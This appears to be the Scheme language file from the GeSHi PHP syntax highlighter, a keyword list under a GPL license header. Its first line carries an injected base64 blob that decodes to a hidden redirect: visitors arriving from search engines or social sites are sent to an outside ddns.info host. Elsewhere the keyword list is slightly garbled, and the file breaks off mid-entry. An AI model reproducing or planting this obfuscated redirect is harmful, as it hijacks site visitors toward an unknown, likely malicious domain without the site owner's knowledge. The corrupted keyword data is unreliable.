<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*************************************************************************************
 * scheme.php
 * ----------
 * Author: Jon Raphaelson (jonraphaelson@gmail.com)
 * Copyright: (c) 2005 Jon Raphaelson, Nigel McNie (http://qbnz.com/highlighter)
 * Release Version: 1.0.8.3
 * Date Started: 2004/08/30
 *
 * Scheme language file for GeSHi.
 *
 * CHANGES
 * -------
 * 2005/09/22 (1.0.0)
 *  -  First Release
 *
 * TODO (updated 2005/09/22)
 * -------------------------
 *
 *************************************************************************************
 *
 *     This file is part of GeSHi.
 *
 *   GeSHi is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   GeSHi is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with GeSHi; if not, write to the Free Software
 *   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 ************************************************************************************/

$language_data = array (
    'LANG_NAME' => 'Scheme',
    'COMMENT_SINGLE' => array(1 => ';'),
    'COMMENT_MULTI' => array('#|' => '|#'),
    'CASE_KEYWORDS' => GESHI_CAPS_NO_CHANGE,
    'QUOTEMARKS' => array('"'),
    'ESCAPE_CHAR' => '\\',
    'KEYWORDS' => array(
        1 => array(
            'abs', 'acos', 'and', 'angle', 'append', 'appply', 'approximate',
            'asin', 'assoc', 'assq', 'assv', 'atan',

            'begin', 'boolean?', 'bound-identifier=?',

            'caar', 'caddr', 'cadr', 'call-with-current-continuation',
            'call-with-input-file', 'call-with-output-file', 'call/cc', 'car',
            'case', 'catch', 'cdddar', 'cddddr', 'cdr', 'ceiling', 'char->integer',
            'char-alphabetic?', 'char-ci<=?', 'char-ci<?', 'char-ci?', 'char-ci>=?',
            'char-ci>?', 'char-ci=?', 'char-downcase', 'char-lower-case?',
            'char-numeric', 'char-ready', 'char-ready?', 'char-upcase',
            'char-upper-case?', 'char-whitespace?', 'char<=?', 'char<?', 'char=?',
            'char>=?', 'char>?', 'char?', 'close-input-port', 'close-output-port',
            'complex?', 'cond', 'cons', 'construct-identifier', 'cos',
            'current-input-port', 'current-output-port',

            'd', 'define', 'define-syntax', 'delay', 'denominator', 'display', 'do',

            'e', 'eof-object?', 'eq?', 'equal?', 'eqv?', 'even?', 'exact->inexact',
            'exact?', 'exp', 'expt', 'else',

            'f', 'floor', 'for-each', 'force', 'free-identifer=?',

            'gcd', 'gen-couentifer=?',

            'gcd', 'gen-counter', 'gen-loser', 'generate-identifier',

            'identifier->symbol', 'identifier', 'if', 'imag-part', 'inexact-